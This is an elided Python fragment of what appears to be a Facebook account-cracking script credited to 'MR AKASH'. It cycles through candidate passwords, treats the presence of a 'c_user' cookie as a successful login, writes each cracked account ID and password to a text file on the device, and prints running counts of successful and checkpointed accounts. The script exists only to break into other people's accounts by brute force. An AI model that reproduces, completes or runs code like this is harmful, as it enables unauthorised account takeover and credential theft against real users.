...
try:
    ...
    os.system("xdg-open https://facebook.com/groups/3508815925862444/")
...
def xyz():
    ...
    os.getuid
    os.system("clear")
    print('         \x1b[97m[\033[37;41m  THIS COMMAND MADE BY MR AKASH \033[0;97m] ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/AKASH-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AKASH] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
